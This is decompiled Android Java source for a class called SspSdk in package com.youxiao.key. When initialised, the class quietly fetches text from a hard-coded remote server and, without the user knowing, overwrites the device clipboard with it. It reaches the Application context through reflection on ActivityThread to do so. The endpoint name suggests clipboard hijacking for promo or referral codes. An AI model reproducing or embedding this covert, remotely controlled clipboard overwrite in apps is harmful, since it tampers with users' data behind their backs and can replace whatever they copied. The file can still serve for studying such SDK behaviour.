package com.youxiao.key;

import android.app.Application;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes6.dex */
public class SspSdk {
    public static final String URL = "https://api.wqycq.com/kouling/getSlogan?code=400";

    public static void initKey() {
        new Thread(new Runnable() { // from class: com.youxiao.key.-$$Lambda$SspSdk$iVewdO-uAyUISwKh4MYyVT-igcI
            @Override // java.lang.Runnable
            public final void run() {
                SspSdk.lambda$initKey$0();
            }
        }).start();
    }

    static /* synthetic */ void lambda$initKey$0() {
        try {
            HttpClient httpClient = new HttpClient();
            httpClient.sendGet(URL);
            if (httpClient.code != 200) {
                return;
            }
            String strOptString = new JSONObject(httpClient.responseBody).optString("text");
            Application applicationByReflect = getApplicationByReflect();
            if (strOptString.isEmpty() || applicationByReflect == null) {
                return;
            }
            putInfoIntoClip(applicationByReflect, strOptString);
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    public static Application getApplicationByReflect() {
        try {
            Class<?> cls = Class.forName("android.app.ActivityThread");
            Object objInvoke = cls.getMethod("getApplication", new Class[0]).invoke(cls.getMethod("currentActivityThread", new Class[0]).invoke(null, new Object[0]), new Object[0]);
            if (objInvoke == null) {
                return null;
            }
            return (Application) objInvoke;
        } catch (Exception unused) {
            return null;
        }
    }

    public static void putInfoIntoClip(Context context, String str) {
        ClipboardManager clipboardManager = (ClipboardManager) context.getSystemService("clipboard");
        if (clipboardManager != null) {
            clipboardManager.setPrimaryClip(ClipData.newPlainText("info", str));
        }
    }
}
